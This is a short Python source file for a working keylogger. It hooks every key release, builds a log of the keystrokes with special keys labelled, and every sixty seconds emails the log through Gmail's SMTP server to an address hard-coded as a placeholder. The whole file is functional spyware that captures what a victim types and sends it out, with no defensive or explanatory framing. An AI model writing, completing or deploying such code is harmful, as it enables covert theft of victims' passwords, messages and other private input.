import keyboard
import smtplib
from threading import Semaphore, Timer

INTERVAL = 60
EMAIL = 'your email'
PASSWORD = 'your password'

# Innitialization Method
class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ''
        self.semaphore = Semaphore(0)

    # Called everytime a Key is pressed on the Keyboard
    def callback(self, event):
        key = event.key
        #if it's a special character then the length > 1
        if len(key) > 1:
            if key == 'space':
                key = ' '
            elif key == 'enter':
                key = '[ENTER]\n'
            elif key == 'decimal':
                key = '.'
            else:
                key = key.replace(' ', '_')
                key = f'[{key.upper()}]'

        self.log += key
        
    #sends email
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
    #calls sendmail after every interval of time
    def report(self):
        if self.log:
            self.sendmail(EMAIL, PASSWORD, self.log)
        self.log = ''
        Timer(interval=self.interval, function=self.report).start()
        
    #called when the object is created
    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()

if __name__ == '__main__':
    kelogger = Keylogger(interval=INTERVAL)
    kelogger.start()
